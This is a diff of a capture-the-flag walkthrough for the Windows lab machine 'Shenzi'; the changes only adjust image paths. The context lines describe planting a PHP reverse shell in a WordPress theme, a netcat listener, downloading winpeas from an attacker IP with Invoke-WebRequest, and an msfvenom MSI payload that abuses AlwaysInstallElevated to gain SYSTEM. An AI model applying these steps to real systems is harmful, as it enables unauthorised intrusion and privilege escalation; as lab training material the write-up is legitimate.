@@ -3,7 +3,7 @@ title: Shenzi PGP walkthrough
 description: Target - Shenzi, OS - Windows
 date: 2025-12-12
 readTime: 10 min read
-image: /assets/images/Shenzi/Xampp-dashboard.png
+image: ../assets/images/Shenzi/Xampp-dashboard.png
 ---
 
 # *Enum*
@@ -53,13 +53,13 @@ Host script results:
 
 `/dashboard/`  has the default XAMPP page with backend language as PHP in use. That is a good point to be noted. We might craft a PHP based reverse shell.
 
-![XAMPP](/assets/images/Shenzi/Xampp-dashboard.png)
+![XAMPP](/1dragon/assets/images/Shenzi/Xampp-dashboard.png)
 
 `php-info` Looking for `document-root`  the path was set `C:xampp/htdocs/`  which is the root directory for the web application being hosted. 
 
 Note: The php-info page usually should not be kept accessible for public. 
 
-![docrt](/assets/images/Shenzi/doc-root.png)
+![docrt](/1dragon/assets/images/Shenzi/doc-root.png)
 
 ---
 # *Initial Access*
@@ -116,20 +116,20 @@ Tried to access the website with `/shenzi` to see if such web page exist and it 
 
 The idea about what if a wordpress site is in just named as `Shenzi` actually comes from the lead that the earlier discovered open SMB shared was named as `Shenzi` hence, why not should it be the name of a page too.
 
-![Shenzi-wp](/assets/images/Shenzi/Shenzi-wp-site.png)
+![Shenzi-wp](/1dragon/assets/images/Shenzi/Shenzi-wp-site.png)
 
 As we have discovered that Wordpress is in use there must be the admin login page which we tried to login with the discovered passwords from the SMB share as the creds belongs to wp-admin. After trying to use the passwords the user name is `admin` is what worked with the discovered password.
 
-![wpadmin](/assets/images/Shenzi/wp-admin.png)
+![wpadmin](/1dragon/assets/images/Shenzi/wp-admin.png)
 
 After loggin in as WP site's admin user and going through the pages under Themes > Appearance there are the actual pages like the index.php, 404.php. 
 
 We discovered earlier that the site uses PHP for backend. Tried to modify the contents of index.php with a php based reverse shell and loaded that.
 
-![Theme](/assets/images/Shenzi/Themes-page.png)
+![Theme](/1dragon/assets/images/Shenzi/Themes-page.png)
 Since we modified the index.php (Main Index Template) page which contains our reverse shell code accessing the page actually loaded the php reverse shell which is a good sign.
 
-![Shenzi-wp](/assets/images/Shenzi/Rev-shell-call.png)
+![Shenzi-wp](/1dragon/assets/images/Shenzi/Rev-shell-call.png)
 
 We have a netcat  listener running at local port.
 
@@ -139,7 +139,7 @@ rlwrp nc -lnvp 4444
 
 use rlwrap for arrow keys funtcionality.
 
-![Shenzi-shell](/assets/images/Shenzi/shenzi-shell.png)
+![Shenzi-shell](/1dragon/assets/images/Shenzi/shenzi-shell.png)
 
 Got the reverse shell connected  as Shenzi user
 
@@ -147,7 +147,7 @@ Executed `whoami, whoami /priv` the  current user is Shenzi and no interesting p
 
 Got the local flag at  `C:/Users/Shenzi/Desktop/local.txt`
 
-![Local](/assets/images/Shenzi/local.png)
+![Local](/1dragon/assets/images/Shenzi/local.png)
 
 ---
 # *Privilege Escalation*
@@ -158,13 +158,13 @@ iwr -uri http://192.168.45.179/wp.exe -o wp.exe
 
 ```
 
-![Transtools](/assets/images/Shenzi/trans-tools.png)
+![Transtools](/1dragon/assets/images/Shenzi/trans-tools.png)
 
 Renamed winpeas.exe as wp.exe
 
 After executing winpeas analyzed the discovered information and the interesting thing is `AlwaysInstallElevated` has been set to 1 that means we might be able to craft a malicious .msi file and execute it get another shell as NT System user .
 
-![](/assets/images/Shenzi/Winpeas.png)
+![](/1dragon/assets/images/Shenzi/Winpeas.png)
 
 Created a msi file with msfvenom which is a reverse shell that connects back to local as system user / NT.
 
@@ -174,15 +174,15 @@ Created a msi file with msfvenom which is a reverse shell that connects back to 
 
 Transferred the .msi file to the target system and executed that.
 
-![Shenzi-wp](/assets/images/Shenzi/msi-exec.png)
+![Shenzi-wp](/1dragon/assets/images/Shenzi/msi-exec.png)
 
 Having a netcat listener listening at 4444 at local. Got the shell connected as NT-AUTHORITY\SYSTEM
 
-![](/assets/images/Shenzi/NT.png)
+![](/1dragon/assets/images/Shenzi/NT.png)
 
 Got the proof.txt under 
 
-![](/assets/images/Shenzi/proof.png)
+![](/1dragon/assets/images/Shenzi/proof.png)
 
 
 
